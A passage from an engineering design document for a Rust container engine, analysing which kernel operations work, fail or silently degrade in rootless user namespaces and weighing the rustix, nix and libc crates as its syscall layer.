kernel.** Measured inside `unshare -Urn` on Rocky 8.8 (`uid_map: 0 <uid> 1`), every one of these
returned success:

```
bridge add br0                      OK     nft table/chain nat postrouting (srcnat)  OK
veth pair create (v0/v1)            OK     masquerade rule                           OK
addr add 10.77.0.1/24 br0           OK     nat prerouting (dstnat) + dnat rule       OK
enslave v0 to br0 (IFLA_MASTER)     OK     filter chain @ priority 0 (DROP)          OK
br0 / v0 / v1 up                    OK     filter chain @ priority -300 (raw)        OK
addr add 10.77.0.2/24 v1            OK     named set (ipv4_addr) + elements          OK
route add 10.88.0.0/24 via …        OK     set-matching drop rule                    OK
iptables -t nat -A POSTROUTING -j MASQUERADE  OK    nft -f <file> (atomic replace)   OK
```

Named sets, base chains at arbitrary priorities including `raw`, and whole-table atomic
replacement all work unprivileged on a four-generation-old kernel. An nftables-based network
design is therefore **not** a root-only design awaiting a rootless retrofit.

**Fact — the gate, stated correctly, because the usual phrasing is wrong.** What a rootless
process cannot do is move an interface *out*. The rule the kernel enforces is
`rtnl_link_get_net_capable()` → `netlink_ns_capable(skb, net->user_ns, CAP_NET_ADMIN)`:
**`CAP_NET_ADMIN` in the user namespace that *owns* the target network namespace.** There is no
such thing as a capability "in a network namespace" — capabilities live in user namespaces.
Measured:

| probe | result |
|---|---|
| host netns, unprivileged: `ip link add … type dummy` / `veth` / `ip addr add` | **EPERM** (all three) |
| inside `unshare -Urn`: `ip link set vout netns 1` | **EPERM** |
| inside `unshare -Urn`: `ip link set vout netns <child netns of the SAME userns>` | **rc=0, OK** |
| inside `unshare -Urn`: `ip link set vout netns <a SIBLING `unshare -Urn` of mine>` | **EPERM** |

The last row is the one that settles it: the sibling netns is not the host's, it is mine, it is
unprivileged, and it was created by my own uid seconds earlier — and the move still fails.
**Trap.** "Needs `CAP_NET_ADMIN` in the host netns" is the wrong framing and it suggests a
rootless engine could attach containers to a bridge it built in some *other* namespace it owns.
It cannot. The only netns a rootless process can push an interface into is one owned by a user
namespace it holds `CAP_NET_ADMIN` in — its own, or a descendant. That is precisely why
`rootlesskit` creates a single "rootless netns" owned by the engine's own user namespace and
puts every container's bridge inside *that*, and why the host boundary is crossed by a userspace
stack rather than by a veth.

**Fact — constructible is not reachable.** A rootless netns with a bridge, an address, a default
route and no helper is a sealed box: measured, DNS times out and a TCP connect returns "No route
to host". The rootless path to the outside is a userspace stack (`pasta`/`passt` or
`slirp4netns`) or the setuid-root `lxc-user-nic`, never a veth.
**Recommendation.** Probe for both stacks and prefer `pasta`, falling back to `slirp4netns`:
`pasta` is absent from RHEL-family 8.x base repositories while `slirp4netns` is present and
works there. That is a two-binary dependency, not one, and it is cheap because both take a pid
and a tap name.

**Fact — overlayfs in a user namespace.** Upstream, `FS_USERNS_MOUNT` for overlayfs **and** the
`userxattr` mount option landed together in **Linux 5.11**: `fs/overlayfs/super.c` contains zero
occurrences of either at v5.10 and nine at v5.11. They were one series.
**Trap.** RHEL 8's 4.18 kernel mounts overlay in a userns and the mount line carries no
`userxattr` — which looks like a partial or different backport and is not. The same 4.18 kernel
**honours `-o userxattr` explicitly** and then writes `user.overlay.*` xattrs, which only a
kernel carrying the 5.11 userxattr code can do. RHEL 8 backported **both halves of the 5.11
series**; it simply does not turn `userxattr` on by itself — exactly as mainline does not. The
observed failure without the option is fully explained: with `userxattr` off, overlay uses
`trusted.overlay.*`, and removing a *directory* that exists only in a lower layer requires
`setxattr(trusted.overlay.opaque)`, which no user namespace can perform, so the copy-up fails and
overlay surfaces **`EIO`**. A plain file unlink in the same configuration succeeds, because it
produces a whiteout instead.
**Recommendation.** Always pass `userxattr` explicitly when not holding `CAP_SYS_ADMIN` in the
initial user namespace, and never when holding it. The default is only a default, and
`nouserxattr` is accepted inside a user namespace too — the kernel will happily hand a rootless
caller a mount that cannot write its own metadata.

**Fact — `mknod` of a whiteout works with no capability at all.**
`torvalds/linux@v6.11/fs/namei.c#L4063-L4074`:

```c
bool is_whiteout = S_ISCHR(mode) && dev == WHITEOUT_DEV;
int error = may_create(idmap, dir, dentry);
if (error) return error;
if ((S_ISCHR(mode) || S_ISBLK(mode)) && !is_whiteout && !capable(CAP_MKNOD))
        return -EPERM;
```

Three things follow. It is **generic VFS code**, above `dir->i_op->mknod`, so every filesystem
that implements `mknod` inherits the exemption — not an overlayfs special case. The check is
`capable()`, not `ns_capable()`, which is why a *userns-root* process still gets `EPERM` for
`mknod c 1 1`: it holds `CAP_MKNOD` in its own namespace and that does not help. And
`may_create()` still runs, so ordinary write permission on the parent is still required — it is
an exemption from `CAP_MKNOD`, not from DAC. Measured as uid 65534 in the **initial** user
namespace with `CapPrm = CapEff = 0`, on both tmpfs and ext4: `mknod c 0 0` → OK,
`mknod c 1 1` → `EPERM`. So a rootless engine can apply whiteouts during layer extraction and
cannot create a single real device node.

**Fact — the rest of the "works" column**, all measured on the 4.18 host: `tmpfs` mounts inside
userns+mntns succeed; `proc` mounts succeed only with a **new PID namespace** as well
(`unshare -Urm` fails `EPERM`, `unshare -Urmpf --mount-proc` succeeds); `sysfs` mounts succeed
only with a **new network namespace** (`unshare -Urm` fails, `-Urmn` succeeds); binding port 80
inside the container's own netns succeeds; seccomp filter installation works (the `no_new_privs`
precondition is met by our default, §13.2); and capability bounding-set drops work, because
`PR_CAPBSET_DROP` needs `CAP_SETPCAP` in the namespace, which a userns creator has.

### 14.2 What degrades, and how loudly

| capability | rootless outcome | how it fails |
|---|---|---|
| map more than one uid | fails without an `/etc/subuid` entry | **loudly** — `EPERM` on the map write; `newuidmap` prints `uid range […] not allowed` from its own check |
| `chown` to an unmapped uid, drop to a service uid | fails | **confusingly** — `EINVAL`, not `EPERM` (§13.3), which reads like a bug in our code |
| cgroup `--memory`, `--cpus`, `--pids-limit` | works **only** with a delegated, controller-enabled subtree | **quietly** unless we make it loud — see §14.3 |
| cgroup `io.max`, `cpuset.cpus` | **permanently unavailable** on a stock systemd host | missing file. `user@.service` carries `Delegate=pids memory cpu`; `io` and `cpuset` are never delegated to a user manager |
| mount `cgroup2` in a userns | fails on the measured host | loudly (`EPERM`), while `tmpfs` in the same namespace succeeds |
| device cgroup (BPF program) | fails | loudly (`EPERM` from `bpf(2)`); `kernel.unprivileged_bpf_disabled = 1` is permanent until reboot |
| `mknod` a real device node | fails | loudly (`EPERM`) — bind-mount instead (§13.6) |
| publish a host port < 1024 | fails | loudly — needs `CAP_NET_BIND_SERVICE` on the host or a lowered `net.ipv4.ip_unprivileged_port_start` |
| `ping_group_range` | fails unless both bounds are mapped gids | `EINVAL`. Under a single-gid map the only writable value is `0 0`; with a full 65536-gid map, `0 65535` — never the documented `0 2147483647` |
| AppArmor profile transition | fails for unprivileged users | **quietly** — the container runs `unconfined`. Landlock (§13.8) is the only LSM that closes this |
| seccomp, bounding-set drop, userns, single-ID map, netns-internal networking, overlay-in-userns | **work** | — |

**Fact.** `ip_unprivileged_port_start = 0` is **per network namespace**, so setting it inside the
container is free for a container with its own netns and is not available at all under
`--net=host`. **Recommendation.** Any plan to drop `CAP_NET_BIND_SERVICE` from the default set
on the strength of that sysctl must be conditional on a private netns, or `--net=host`
containers lose the ability to bind low ports with no compensating mechanism.

### 14.3 What merely appears to work

**The one that matters.** Cgroup limits without delegation, because **the natural implementation
succeeds at every step.** Either `mkdir` fails and the code logs and continues; or `mkdir`
succeeds inside a delegated subtree but the controller is absent from the parent's
`cgroup.subtree_control`, so `memory.max` **does not exist**, the write fails `ENOENT`, and the
code logs and continues. Either way the container runs, `inspect` reports
`Memory: 536870912`, and nothing is enforced. Note the errno: on a stock systemd host the common
rootless failure is a **missing file**, not `EACCES` — verified live, `io` and `cpuset` are in
`user.slice`'s `cgroup.controllers` and not in its `cgroup.subtree_control`.

**Fact.** Rootless cgroup delegation requires **all four** of: cgroup v2 unified (v1 is
structurally impossible, §12.7); a systemd **user** session with `Delegate=` set; the wanted
controllers present in
`/sys/fs/cgroup/user.slice/user-<uid>.slice/user@<uid>.service/cgroup.controllers`; and the
process actually *inside* that subtree, which a bare `ssh` session is not on some
configurations. On the measured Rocky 8.8 host, **zero of the four hold**: v1 only, no delegation
anywhere, every controller root mode `555`, and the session directories the kernel names in
`/proc/self/cgroup` for `pids` and `memory` do not exist as directories at all. The honest
answer for that host is "we cannot limit resources here", and §12.7's tier table is how the
engine says it.

**Recommendation.** Probe once at startup for a writable, controller-enabled subtree; record the
answer in one place; make any **explicitly requested** limit a hard error when the answer is
"none", and a logged note when the limit was merely a default. Do not retry per container. The
probe is: resolve our own cgroup from `/proc/self/cgroup`'s `0::` line, walk up to a directory
we can `mkdir` in, and read its `cgroup.controllers`.

**The others, each quiet in its own way:**

- **`/proc` masking without a dropped `CAP_SYS_ADMIN`.** Masks are per-superblock (§13.4): a
  second `proc` mount in the same namespace yields a clean `/proc` with `/proc/kcore` present.
  A rootless container's userns-root *does* hold `CAP_SYS_ADMIN` in its own namespace and *can*
  mount `proc` there. Masking that is not paired with a bounding-set drop and a seccomp `mount`
  gate is decoration, and it looks identical in the mount table to masking that is.
- **`ping_group_range` reading `65534 65534`.** That is not "a group range is already
  configured". `inet_init_net()` sets `make_kgid(&init_user_ns, 1)`/`(…, 0)` — the upstream
  default is `1 0`, an *empty* range — and read from inside a userns where neither init-gid is
  mapped, both bounds render as `overflowgid` = 65534. An implementation that parses the current
  value to decide whether to write will decide wrongly, and silently.
- **`EINVAL` from `chown`/`setresuid`.** It reads as an argument bug in our code rather than a
  missing `/etc/subuid` line (§13.3). Intercept it with a message naming the real cause.
- **An AppArmor host where our container shows `unconfined`.** Nothing errors. The container
  simply runs with one fewer independent layer than a Docker container on the same host would.

### 14.4 Which retrofits are structurally expensive, and which are cheap

The distinction that matters is not "how much code" but **whether root leaks into types and
control flow or into one function**.

**Expensive, ranked by cost of doing them later:**

1. **The process topology around `uid_map`.** A process that has `execve`'d since
   `unshare(CLONE_NEWUSER)` has zero capabilities and cannot write any map (§13.3). If the
   engine's architecture is "daemon forks, child re-execs a helper, helper sets everything up",
   the map must be written by the **daemon** into `/proc/<child>/uid_map` while the child waits.
   Retrofitting that inverts who does the setup — a change to the process topology, not to a
   function. The 5.12 `CAP_SETFCAP` rule adds a second, independent reason the parent must be
   the writer for any map containing host uid 0. **Cost if deferred: high. Cost now: one sync
   pipe we need anyway.**
2. **A mount abstraction with no `Option<IdMapping>`.** If every mount call takes
   `(source, target, fstype, flags, data)` and idmapped mounts arrive later, it is not an extra
   argument — the mount becomes a three-step sequence
   (`open_tree(OPEN_TREE_CLONE)` → `mount_setattr(MOUNT_ATTR_IDMAP)` → `move_mount`) instead of
   one `mount(2)`, at every call site. **Cost if deferred: high.**
3. **A multithreaded process performing container setup.** Three subsystems behave differently
   in a threaded process: seccomp needs `TSYNC` (§13.2), `unshare(CLONE_NEWUSER)` has different
   semantics, and `landlock_restrict_self(2)` propagates `no_new_privs` to sibling threads — on
   top of `fork`-safety in the post-`clone` window. If the setup path ends up inside an async
   runtime, extracting it later is a restructure. **Cost if deferred: high.**
4. **Privilege-conditional behaviour scattered as `if is_root()`.** `mknod` or bind-mount a
   device; attach a BPF device program or not; set cgroup limits or not; create a veth or call a
   userspace network stack; `chown` extracted layers or idmap them; load an AppArmor profile or
   a Landlock ruleset. Scattered, that is roughly fifteen branches that drift out of sync.
   **Cost if deferred: medium, and pervasive — the worst kind.**
5. **`0` meaning both "unlimited" and "unspecified".** Without `Option<u64>`, the §12.7 error
   ("you asked for a limit we cannot apply") is unexpressible, because we cannot tell that the
   user asked. **Cost if deferred: medium, and it is API-visible.**
6. **Lazily discovering the mount table and the cgroup root and threading the results through
   calls.** Rootless sees a different mount table and a different cgroup root, and with lazy
   discovery there is no single place to substitute the rootless answer.
   **Cost if deferred: low-medium.**

**Cheap — do not pre-build these.** `newuidmap`/`newgidmap` invocation (one function, called
from the one place item 1 creates); `fuse-overlayfs` fallback (a storage-driver selection the
storage layer needs to be pluggable for anyway); `pasta`/`slirp4netns` (a network-driver
selection, two binaries probed at startup); a port-forwarding helper for ports below 1024 (an
out-of-process detail); and XDG-based state directories (`$XDG_RUNTIME_DIR` instead of `/run`) —
a path constant.

### 14.5 The seam

**Recommendation — one value, built once by probing, threaded read-only, with every
privilege-dependent *mechanism* behind a trait rather than behind `if root`.**

```rust
/// Determined ONCE at engine startup by probing — never by version-sniffing and never
/// by `euid == 0`. Immutable thereafter. The single source of truth about what this
/// process is allowed to do.
struct Privilege {
    euid: Uid,
    /// capabilities we actually hold in the INITIAL user namespace
    host_caps: CapSet,
    /// Some(range) if /etc/subuid grants us one; None => single-uid self-map only
    subid: Option<SubIdRanges>,
    /// Some(root) if we found a writable subtree AND which controllers it has enabled
    cgroup_root: Option<CgroupRoot>,
    kernel: KernelFeatures,   // cgroup.kill? openat2? idmapped mounts? clone3? landlock ABI?
    lsm: LsmState,            // apparmor enabled? selinux enforcing? landlock present?
}
```

Three rules make it work, and all three are disciplines rather than code:

1. **Nothing below the top level calls `geteuid()`, `capget()`, or reads `/etc/subuid`.**
   Everything receives `&Privilege`. If that is enforced, rootless becomes a matter of
   constructing a different `Privilege` and filling in drivers, not of finding branches.
2. **Every operation that can fail for privilege reasons returns three values, not two:**
   `Applied`, `Skipped(reason)`, `Failed(err)`. §12.7's rule — requested limits are hard errors,
   defaulted ones are logged notes — is only expressible if the type distinguishes them.
3. **Privilege-dependent mechanisms go behind traits chosen once, in one factory function that
   takes `&Privilege`:** `CgroupManager`, `MountBackend` (`mount(2)` versus
   `open_tree`+`mount_setattr`+`move_mount`), `DeviceController` (BPF or none), `NetworkDriver`
   (veth or userspace stack), `StorageDriver`. The rest of the engine never learns which was
   chosen.

**Fact worth encoding in the constructor.** `euid == 0` is not the question. A root process
inside a container with a 14-capability bounding set is **not** privileged for our purposes —
which is exactly the situation for anyone running this engine inside Docker to test it, and
exactly the situation where `euid == 0` lies. `Privilege` must be built by probing what we
actually hold.

**Recommendation — the cost, stated honestly.** Threading `&Privilege` through the engine is
boilerplate, and for a root-only first version it buys nothing visible. The argument for paying
it now is §14.4: six retrofits, three of them high-cost-if-deferred, all of which this seam
converts to low. Without it, the rootless work later is a rewrite of the container-setup path
rather than an addition to it. **This is the one piece of speculative structure in the design
that earns its keep, and it should be the only one.**

### What this decides

This section feeds the root-required assumption directly. Each row is a Phase 4 classification.

| decision | classification |
|---|---|
| Build `Privilege` once by probing and thread it read-only; no `geteuid()` below the top level | **DECIDE NOW** — it is the seam; retrofitting it is the rewrite it exists to prevent |
| Parent writes `uid_map`/`gid_map` into `/proc/<child>/…` while the child blocks on a sync pipe | **DECIDE NOW** — a process-topology choice, and the sync pipe is needed regardless |
| `Option<IdMapping>` on every mount call, `None` in root mode | **DECIDE NOW** — otherwise it is a different syscall sequence at every call site |
| Container setup runs single-threaded, outside any async runtime | **DECIDE NOW** — forced independently by seccomp, `unshare`, Landlock and `fork` safety |
| `Option<u64>` limits and `Applied`/`Skipped`/`Failed` results | **DECIDE NOW** — API-visible type change later |
| Single-ID rootless (self-map, no helper, no third process) as an intermediate target | **DEFER SAFELY** — the seam above makes it an addition; it needs no new topology |
| `newuidmap`/`newgidmap` for multi-ID maps, ordered **before** any `no_new_privs` | **DEFER SAFELY** — one function, one documented ordering constraint |
| Rootless networking via `pasta` with `slirp4netns` fallback, both probed | **DEFER SAFELY** — a driver behind `NetworkDriver`; two binaries, not one |
| `fuse-overlayfs` fallback and `userxattr` passed explicitly when unprivileged | **DEFER SAFELY** — a storage-driver selection |
| Landlock as the rootless LSM, probed by ABI version | **DEFER SAFELY** — three syscalls, no dependency, closes the one quiet LSM failure |
| Whether an MVP may run at all with no writable cgroup | **EXPERIMENT FIRST** — the tier behaviour is decided (§12.7); what is untested is whether the resulting container is useful enough to ship as a mode |

---

## 15. The Rust ecosystem

This is not a crate list. Every candidate is answered against four questions: **what abstraction
does it provide**, **does it hide a mechanism we are here to learn**, **is it maintained and does it
cover what we need**, and **would a direct `libc`/`rustix` call be preferable**. In this project the
second question inverts the usual calculus: a crate that saves us from understanding a kernel
interface is a **cost**. A crate that saves us from transcribing a JSON schema is a benefit, because
there is no mechanism in a JSON schema.

**How claims are tagged here.** Kernel, ABI and glibc behaviour is **Fact**, cited to a pinned
source. What a *crate* does is **Convention** and always carries its version — it is what that
release happens to do, and a bump can change it. Crate readings and dates are as of **2026-10-23**.

---

### 15.1 The foundational choice: `rustix`, not `nix`, not raw `libc`

**Recommendation.** Take **`rustix` 1.1.5** as the single syscall layer, with a **seven-call raw
`libc` surface** written down beside it (§15.2), and **no `nix` at all**. Confine every `rustix`
import behind one internal module so the whole dependency is replaceable by editing one file.

What settles this is narrower and more mechanical than a general comparison of three crates. It is
one function family.

#### 15.1.1 The decisive finding: `rustix` *is* the hand-written mitigation, packaged

**Fact.** glibc does not implement `setuid(2)` as a syscall. Every member of the `set*id` family
goes through one macro, `glibc-2.40/sysdeps/nptl/setxid.h`:

```c
#define INLINE_SETXID_SYSCALL(name, nr, args...)                          \
  ({ int __result;                                                        \
     if (!SINGLE_THREAD_P)                                                \
       { struct xid_command __cmd; … __result = __nptl_setxid (&__cmd); } \
     else                                                                 \
       __result = INLINE_SYSCALL (name, nr, args);                        \
     __result; })
```

`SINGLE_THREAD_P` is `THREAD_GETMEM (THREAD_SELF, header.multiple_threads) == 0`
(`glibc-2.40/sysdeps/unix/sysv/linux/single-thread.h`) — a TCB field. When it is false,
`__nptl_setxid` (`glibc-2.40/nptl/nptl_setxid.c:175-278`) first takes `GL(dl_stack_cache_lock)`,
then walks `GL(dl_stack_used)`, `tgkill`s every listed thread with `SIGSETXID`, and futex-waits for
each acknowledgement in a loop that is uninterruptible except by a signal.

**Fact.** A raw `clone3` child inherits `header.multiple_threads` verbatim and the kernel does not
reset it. The listed threads do not exist in that child, the counter is never decremented, and there
are **two** independent hangs: the lock is taken *before* anything is signalled, so the child can
block before it has even tried to broadcast.

**Convention.** `rustix 1.1.5`'s `thread::{set_thread_uid, set_thread_res_uid, set_thread_gid,
set_thread_res_gid, set_thread_groups}` issue the raw syscall on **both** backends:

```rust
// src/backend/linux_raw/thread/syscalls.rs:402   — inline asm, no libc symbol touched
unsafe { ret(syscall_readonly!(__NR_setuid, uid)) }
// src/backend/libc/thread/syscalls.rs:391
syscall! { fn setuid(uid: c::uid_t) via SYS_setuid -> c::c_int }
```

That `syscall!` macro (`rustix-1.1.5/src/weak.rs:164-252`, `#[cfg(linux_kernel)]`) expands to
**`libc::syscall(SYS_setuid, …)`**, not `libc::setuid`. So even on the libc backend the broadcast
path is unreachable by construction. `nix 0.31.3`'s `unistd::{setuid, setgid, setgroups}` call
`libc::setuid`/`setgid`/`setgroups` — i.e. exactly the macro above.

**Recommendation.** That is the whole argument. Mature runtimes hand-write
`libc::syscall(libc::SYS_setresuid, …)` for this step under a comment asserting the process is
single-threaded. **`rustix::thread::set_thread_res_uid` is that mitigation, already packaged** —
`unsafe`-free at the call site and returning a non-allocating error. Taking `nix` here would mean
bypassing `nix` for the one call where a wrapper earns its keep, which is the pattern for every
other primitive we need (§15.1.3).

**Recommendation (two caveats, neither changing the verdict).** `set_thread_groups(&[])` issues
`setgroups(0, ptr)` with a dangling-but-aligned pointer, which the kernel does not dereference at
`len == 0` — fine, but the identity-drop *ordering* is ours, and in a user namespace
`/proc/self/setgroups` must be written `deny` **before** the uid map, which is a file write, not
this call. And these are per-thread by design, so "this process has exactly one thread" is a
**correctness precondition**, not hygiene: assert `Threads: 1` from `/proc/self/status` immediately
before the clone.

#### 15.1.2 What taking the `linux_raw` backend means

**Convention.** `rustix-1.1.5/build.rs:101-127` selects the libc backend only if
`feature_use_libc || cfg_use_libc || os != "linux" || !inline_asm_name_present || is_unsupported_abi
|| miri || ((powerpc|s390x|mips) && !experimental_asm)`. On `x86_64-unknown-linux-gnu` and `-musl`
every disjunct is false, so **`linux_raw`** is selected. The decision keys on `target_os`, not
`target_env`, so musl is indistinguishable from gnu to it. Escape hatches for the record:
`--cfg=rustix_use_libc`, the `use-libc` feature, `--cfg=rustix_no_linux_raw`, and **`miri`** — under
Miri rustix silently switches to the libc backend, which matters if we ever try to Miri the child.

**What it buys.** `grep -rn "errno_location|__errno|thread_local|#\[thread_local\]"` over
`rustix-1.1.5/src/backend/linux_raw/` returns **zero hits**. There is no TLS access of any kind in
that backend; errors travel in the return register as
`#[repr(transparent)] pub struct Errno(u16)` (`src/backend/linux_raw/io/errno.rs`), left in the
kernel's negated form with a `rustc_layout_scalar_valid_range` attribute proving the author intends
it as a register value. In the post-`clone` window there is no `errno` variable to be stale and no
`std::io::Error` to allocate.

**Recommendation.** State that benefit at exactly its real strength. After a `clone` *without*
`CLONE_VM` — our case — the child's TLS is a private copy-on-write page, so a libc `errno` read
would be **defined**, merely possibly stale-looking. `linux_raw` removes a category of confusing
bug, not a category of undefined behaviour. Sell it as robustness or a future reader will
over-trust it somewhere else.

**What it costs — and this is where our architecture portability actually lives.** `linux_raw` is
**per-architecture inline `asm!`**. x86_64 first is fine; the moment we build for aarch64, our
syscall correctness *is* rustix's asm quality on aarch64, a smaller-tested path. That is an
acceptable bet, to be recorded as the coupling it is. Related: `libc::clone_args` is **absent from
every 32-bit target** (`grep -rln "struct clone_args"` over `libc-0.2.191`'s `b32/` trees returns
nothing — not x86, not arm, not riscv32), so an i686 or armv7 port needs our own `#[repr(C)]` copy.

#### 15.1.3 Why `nix` loses, and the one claim about it that is false

**Convention.** `nix 0.31.3` is missing the entire *modern* process-creation and process-handle
surface. Hits by grep over `nix-0.31.3/src`:

| Constant / call | hits | Who needs it |
|---|---|---|
| `clone3` | **0** | the primary creation path |
| `CLONE_PIDFD` | **0** | holding the container as a pidfd rather than a pid |
| `CLONE_INTO_CGROUP` | **0** | race-free cgroup placement at creation |
| `pidfd_open` / `pidfd_send_signal` / `pidfd_getfd` | **0** | supervision with no PID-reuse window |
| `close_range` | **0** | fd hygiene immediately before `execve` |
| `fsopen` / `fsmount` / `move_mount` / `open_tree` / `fsconfig` / `mount_setattr` | **0** | the new mount API |
| `CLONE_NEWTIME` | **0** | time namespaces |

`nix::sched::CloneFlags` is `libc_bitflags! { pub struct CloneFlags: c_int }` and its list ends at
`CLONE_IO`; three further flags are commented out in-source with *"Not supported by Nix due to lack
of varargs support in Rust FFI"*. A `c_int` bitflags type could never have carried the flags above
bit 31 anyway (§15.3).

**Convention.** `nix::sched::clone` is the wrong shape independently of soundness
(`nix-0.31.3/src/sched.rs:88,108`): it takes `CloneCb = Box<dyn FnMut() -> isize>` and passes
`&mut cb` — a pointer to a local in `clone`'s **own stack frame** — to a child running on a
different stack.

**Recommendation.** Reject it for the **signature**, not the soundness bug. The bug is real and
tracked in three separate open upstream issues, the oldest filed 2016 — but a fixed version would
still be the wrong API, because **it takes a Rust closure**, and a closure is an invitation to
capture a `String`, a `PathBuf` or a log span into the one region of the program where allocation
can deadlock forever (§15.4). The signature argument survives the bug being fixed; the soundness
argument does not.

**Trap.** Do **not** repeat the claim that `nix` lacks `openat2`. `nix-0.31.3/src/fcntl.rs:389` is
`pub fn openat2<P: ?Sized + NixPath, Fd: AsFd>(dirfd, path, how) -> Result<OwnedFd>`, with a
complete `ResolveFlag` set (`RESOLVE_NO_SYMLINKS`, `RESOLVE_NO_XDEV`, `RESOLVE_BENEATH`,
`RESOLVE_IN_ROOT`, `RESOLVE_NO_MAGICLINKS`), an `OpenHow` newtype correctly zero-initialised via
`MaybeUninit::zeroed()`, and a builder. The claim is checkable and wrong, and an argument resting on
it will be dismissed along with the rest.

**Maintenance, stated honestly — because it is *not* the reason to decline.** `nix-rust/nix`:
3,082 stars, 370 open issues, last push 2026-10-18, not archived, ~170 M downloads per 90 days. The
repository stalled for **19 weeks** (last feature commit 2026-05-19) and resumed 2026-09-29 with six
commits from one new contributor — lint, CI and rustdoc only. No release since **0.31.3,
2026-05-11**. Issue **#1304, "Nix needs more maintainers"**, has been **open since 2020-10-03**, last
updated 2026-09-24, and contains the maintainer's own words: *"my responsiveness has been lagging…
TBH I've been burning out, too. Would somebody volunteer to help me with this crate?"* Issue
**#2797** (open, 2026-05-18) is a third-party audit of all `src/` unsafe code filing **CRITICAL**
findings — `unistd::dup2_raw` wrapping an unchecked `-1` in an `OwnedFd` so `Drop` calls
`close(-1)`, and `SigSet::wait()` applying `Errno::result` to `sigwait(3)`, which returns a positive
errno and never `-1`, so every failure is silently treated as success. Both land in modules `nix`
would have been taken *for*.

**Recommendation.** Record maintenance as a firm caution flag, then decline `nix` on the technical
grounds above. A perfectly maintained `nix` still has no `clone3`, no `CLONE_PIDFD` and no
`pidfd_open`, and still routes `setuid` through the broadcast. An argument made on maintenance
evaporates the week someone revives the crate.

#### 15.1.4 `rustix`'s boundary, and the one module to never touch

**Convention.** `rustix-1.1.5/src/not_implemented.rs` states the crate's own scope: *"when a libc is
present, it expects to be the only thing in the process that can do certain operations… only one
`atexit` list in a process, only one `pthread_atfork` list…"*. The partition is what to re-read on
every version bump:

| Sub-module | Count | Contains, among others |
|---|---|---|
| `libc_internals` | 147 | `exit`, `fork`, `clone`, **`clone3`**, `sigaction`, `sigprocmask`, `setuid`, `setgid`, `setgroups`, `setresuid`, `pthread_atfork`, + 121 `pthread_*` |
| `quite_yet` | 7 | `_exit`, `_Exit`, `exit_group`, `sigpending`, `sigsuspend`, `execveat`, **`execve`** |
| `yet` | 30 | `signalfd`, **`mount_setattr`** |
| `impossible` | 6 | `vfork`, `sigreturn`, `setjmp`, `longjmp`, `sigsetjmp`, `siglongjmp` |
| `memory_allocation` | 7 | the malloc family |

**Trap.** **`rustix::io::close_range` does not exist.** `grep -rin close_range` over the entire
`rustix-1.1.5` crate returns zero hits; `src/io/mod.rs` exports exactly `close`, `dup`, `errno`,
`fcntl`, `ioctl`, `read_write`. This matters because the fd sweep is the *last* action before
`execve`, in the child, where allocation and error formatting are forbidden — so a developer
reaching for a function that does not exist improvises at exactly that point, and the improvisation
that fails silently is iterating `/proc/self/fd`, which allocates (a `readdir`) and mutates the fd
table it is walking. The correct call is in §15.2.

**Convention.** There *is* a `rustix::runtime` module with `kernel_fork`, `execve`, `execveat`,
`kernel_sigprocmask` and `exit_group`. Its header: *"⚠ These are not normal functions. ⚠ — **Some**
of the functions in this module cannot be used in a process which also has a libc present… Such
functions are not marked `unsafe` … even though they invoke Undefined Behavior if called in a
process which has a libc present. — The API for these functions is not considered stable, and this
module is `doc(hidden)`."*

**Recommendation. Never use `rustix::runtime`** — and state the reason at exactly the strength of
the evidence: the UB warning is a **blanket** warning over an unspecified subset (the per-function
docs for `execve`/`execveat` do not repeat it), but the module is `doc(hidden)`, explicitly not
API-stable, and its author's stated audience is libc replacements. A foundation crate's unstable
hidden module is the worst possible home for the single most important `unsafe` call in the project.

**Fact, and the best statement of §15.4 found anywhere — written by the author of our foundation
crate.** `rustix-1.1.5/src/runtime.rs`, on `kernel_fork`: *"All code that executes in this
environment must avoid: — Acquiring any other locks that are held in other threads on the parent at
the time of the `fork`… — Performing any dynamic allocation using the global allocator, since global
allocators may use locks… and their locks may not be released in the child process… **But, what does
async-signal-safe even mean in a Rust program? This documentation does not have all the answers. So
you're on your own.**"*

#### 15.1.5 `rustix`'s bus factor — a risk to accept knowingly

**Convention.** `bytecodealliance/rustix`: 2,097 stars, 146 open issues, last push 2026-09-16, not
archived, **1.1.5 released 2026-09-16**, ~315 M downloads per 90 days. `Cargo.toml` lists exactly
two authors.

**Uncertain.** The commonly cited "one maintainer authored 22 of the last 61 commits" could **not**
be re-derived — GitHub's `/stats/contributors` returns `202` while it computes. Treat the arithmetic
as unverified; the qualitative claim (one primary maintainer plus a contributor tail) is not in
doubt, and nothing rests on the number. A `git clone` plus `git shortlog -sn --since=…` would settle
it.

**Recommendation.** Accept the risk and mitigate it **architecturally, not socially**. Download
volume is a mitigation stated backwards: it does not mean the maintainer gets replaced, only that
*something* will happen. The real mitigation is that rustix's value to us is concentrated in roughly
40 thin syscall wrappers, so replacing our subset is a few hundred lines. Three commitments:

1. **Keep §15.2's written-down raw-call list current.** It is the inventory of what we would have to
   write if rustix vanished, and it stays short only if it is maintained.
2. **Confine rustix behind one internal `crate::sys::` module** re-exporting only our subset. If
   every call site says `crate::sys::openat2`, replacing rustix is editing one file; if call sites
   name rustix directly, it is editing the project. ~60 lines now.
3. **Pin an exact version and re-read `not_implemented.rs` on every bump.** That file is where
   `mount_setattr` and `close_range` will appear if they ever do. Both are **still absent in 1.1.5**.

**Honest deflation.** `rustix` has **zero** RUSTSEC advisories ever (`crates/rustix/` does not exist
in the advisory DB at head `84d943a6`, 2026-10-23) — on a surface of **1,792 `unsafe` occurrences
across 71,950 lines in 315 files**, plus per-architecture inline `asm!`. Zero advisories on that
surface is mildly surprising, not reassuring. The argument that carries weight is structural: on the
Linux path there are no libc buffer contracts to misread. The advisory count is decoration.

---

### 15.2 The hand-written surface: seven calls and one constant, about 25 lines

**Recommendation.** Write down, in one maintained comment block, the complete list of syscalls our
syscall layer refuses to make. It is **seven calls and one constant, ≈25 lines**, of which 15 are
the single `clone3` block.

| # | Call | Why `rustix` declines it | What `libc 0.2.191` supplies | Our lines |
|---|---|---|---|---|
| 1 | `clone3` | `not_implemented::libc_internals` | `SYS_clone3` + `struct clone_args` | **~15** |
| 2 | `execve` | `quite_yet` | `pub fn execve` | 1 |
| 3 | `_exit` | `quite_yet` | `pub fn _exit(..) -> !` | 1 |
| 4 | `sigprocmask` | `libc_internals` | `pub fn sigprocmask` | 1 |
| 5 | `signalfd` | not wrapped | `pub fn signalfd` | 1 |
| 6 | **`close_range`** | **absent entirely** (§15.1.4) | `SYS_close_range` + `CLOSE_RANGE_CLOEXEC` | 1 |
